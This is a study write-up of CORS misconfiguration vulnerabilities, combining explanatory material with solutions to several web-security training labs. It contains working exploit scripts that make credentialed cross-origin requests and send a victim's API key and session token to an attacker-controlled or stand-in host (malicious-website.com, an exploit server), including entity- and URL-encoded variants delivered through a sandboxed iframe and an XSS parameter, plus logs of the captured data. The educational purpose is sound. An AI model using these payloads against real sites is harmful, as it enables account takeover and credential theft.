## What is CORS (cross-origin resource sharing)?
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 
### Same-origin policy

The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.
### Relaxation of the same-origin policy

The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).

The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
### Vulnerabilities arising from CORS configuration issues

Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

### Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

The path `/accountDetails` return a json of the current acount, which use a session
```json
{
  "username": "wiener",
  "email": "",
  "apikey": "XVOZBxHo45ldhXy8vSIBaN0ML99YMTvH",
  "sessions": [
    "bZlcAIuUUMKFnLV7WZPl4nYh3yj9TqSW"
  ]
}
``` 
In the response contains the **Access-Control-Allow-Credentials** header suggesting that it may support CORS. 

Tesing with Origin header, the origin is reflected in the **Access-Control-Allow-Origin** header. 
```
Origin: nglong05.com
```
```
Access-Control-Allow-Origin: nglong05.com
```
CORS script:
```html
<script>
const req = new XMLHttpRequest()

req.open('get', 'https://0a67009a0332ecba814c0e6000840076.web-security-academy.net/accountDetails', true)

req.onload = () => {window.location.href = '/nglong05?key=' + req.responseText}

req.withCredentials = true
req.send()
</script>
```
Log:
```
"GET /nglong05?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22VxJDMaVpi7mUFbqT5EgNNzprnAZFXY76%22,%20%20%22sessions%22:%20[%20%20%20%20%22uFwrldtV8mK8sjMrFlQaOecey2B58Gvl%22%20%20]} HTTP/1.1" 404 "user-agent: Chrome/811895"
```
Which contain the administrator session
```json
{"username": "administrator",  "email": "",  "apikey": "VxJDMaVpi7mUFbqT5EgNNzprnAZFXY76",  "sessions": [    "uFwrldtV8mK8sjMrFlQaOecey2B58Gvl"  ]}
```
## Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
It then responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```
These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (**Access-Control-Allow-Credentials: true**) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
}; 
```
### Errors parsing Origin headers

Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```
The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com 
```



Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:
```
normal-website.com
```
An attacker might be able to gain access by registering the domain:
```
hackersnormal-website.com
```
Alternatively, suppose an application grants access to all domains beginning with
```
normal-website.com
```
An attacker might be able to gain access using the domain:
```
normal-website.com.evil-user.net
```

### Whitelisted null origin value

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

-    Cross-origin redirects.
-    Requests from serialized data.
-    Request using the file: protocol.
-    Sandboxed cross-origin requests.

### Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

In this lab, the "null" origin is reflected in the **Access-Control-Allow-Origin** header. 

We can reuse the above lab script and modify it
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="HTML-encoded-script"></iframe>
```
The **null** origin can be triggered in sandboxed iframes, data URLs, and some cross-origin redirects.

Using an `<iframe>` with `sandbox="allow-scripts allow-top-navigation allow-forms"` makes the request appear to come from a null origin.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x0a;&#x63;&#x6f;&#x6e;&#x73;&#x74;&#x20;&#x72;&#x65;&#x71;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x0a;&#x0a;&#x72;&#x65;&#x71;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x27;&#x67;&#x65;&#x74;&#x27;&#x2c;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x30;&#x61;&#x33;&#x38;&#x30;&#x30;&#x38;&#x35;&#x30;&#x34;&#x61;&#x64;&#x31;&#x61;&#x32;&#x35;&#x38;&#x39;&#x65;&#x33;&#x32;&#x64;&#x36;&#x66;&#x30;&#x30;&#x32;&#x31;&#x30;&#x30;&#x32;&#x36;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x44;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;&#x27;&#x2c;&#x20;&#x74;&#x72;&#x75;&#x65;&#x29;&#x0a;&#x0a;&#x72;&#x65;&#x71;&#x2e;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x28;&#x29;&#x20;&#x3d;&#x3e;&#x20;&#x7b;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x20;&#x3d;&#x20;&#x27;&#x2f;&#x6e;&#x67;&#x6c;&#x6f;&#x6e;&#x67;&#x30;&#x35;&#x3f;&#x6b;&#x65;&#x79;&#x3d;&#x27;&#x20;&#x2b;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x7d;&#x0a;&#x0a;&#x72;&#x65;&#x71;&#x2e;&#x77;&#x69;&#x74;&#x68;&#x43;&#x72;&#x65;&#x64;&#x65;&#x6e;&#x74;&#x69;&#x61;&#x6c;&#x73;&#x20;&#x3d;&#x20;&#x74;&#x72;&#x75;&#x65;&#x0a;&#x72;&#x65;&#x71;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x29;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"></iframe>
```
Log:
```
"GET /nglong05?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%227UKgYS5QsisFVJVGWpcDwpn8Wt3Zx1YS%22,%20%20%22sessions%22:%20[%20%20%20%20%22QiB71OOt9bAUaTNmgjk1nthsKw3MYZ9J%22%20%20]} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
Which contains the data:
```json
{  "username": "administrator",  "email": "",  "apikey": "7UKgYS5QsisFVJVGWpcDwpn8Wt3Zx1YS",  "sessions": [    "QiB71OOt9bAUaTNmgjk1nthsKw3MYZ9J"  ]}
```
## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

Given the following request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
If the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
The application responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true 
```
### Lab: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

**XSS vulnerability**

This request is able to perform XSS
```html
GET /?productId=<script>alert('XSS')</script>&storeId=1 HTTP/2
Host: stock.0a4800950308783f80899e36005400c9.web-security-academy.net
```
**CORS vulnerability**

This request-response indicate a CORS vul
```
GET /accountDetails HTTP/2
Host: 0a4800950308783f80899e36005400c9.web-security-academy.net
Cookie: session=0AGOxm11BHzdEefaCA5sdwWWe7wdCZqi
Origin: http://stock.0a4800950308783f80899e36005400c9.web-security-academy.net
```
```
HTTP/2 200 OK
Access-Control-Allow-Origin: http://stock.0a4800950308783f80899e36005400c9.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "jz5DEHB0zRRPHCgdghQq1HQC0IVEnJ5A",
  "sessions": [
    "0AGOxm11BHzdEefaCA5sdwWWe7wdCZqi"
  ]
}
```
**Lab solution**

The idea is to embeded a CORS script into a **window.location** to the vulerable XSS url

```html
<script>
  window.location = "http://stock.0a4800950308783f80899e36005400c9.web-security-academy.net/?productId=cors-script-here&storeId=1"
</script>
```
CORS script:
```html
<script>
const req = new XMLHttpRequest()

req.open('get', 'https://0a4800950308783f80899e36005400c9.web-security-academy.net/accountDetails', true)

req.onload = () => {window.location = 'https://exploit-0a8300f003e67846807b9d23014c005b.exploit-server.net/nglong05?key=' + req.responseText}

req.withCredentials = true
req.send()
</script>
```
In the final script, the cors script need to be url-encoded
```html
<script>
  window.location = "http://stock.0a4800950308783f80899e36005400c9.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%63%6f%6e%73%74%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%0a%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%20%27%68%74%74%70%73%3a%2f%2f%30%61%34%38%30%30%39%35%30%33%30%38%37%38%33%66%38%30%38%39%39%65%33%36%30%30%35%34%30%30%63%39%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%20%74%72%75%65%29%0a%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%7b%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%38%33%30%30%66%30%30%33%65%36%37%38%34%36%38%30%37%62%39%64%32%33%30%31%34%63%30%30%35%62%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%6e%67%6c%6f%6e%67%30%35%3f%6b%65%79%3d%27%20%2b%20%72%65%71%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%7d%0a%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%0a%72%65%71%2e%73%65%6e%64%28%29%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>
```
Log:
```
/nglong05?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22oYIspilH5wN48A2O9aFp2lSCTn8eGrz1%22,%20%20%22sessions%22:%20[%20%20%20%20%22bADPIAoANy5VtQm2axXQ4AF1QWUC9R8G%22%20%20]} HTTP/1.1" 404 "user-agent: Chrome/145223"
``` 
## Intranets and CORS without credentials

Most CORS attacks rely on the presence of the response header:
Access-Control-Allow-Credentials: true

Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
And the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: * 
```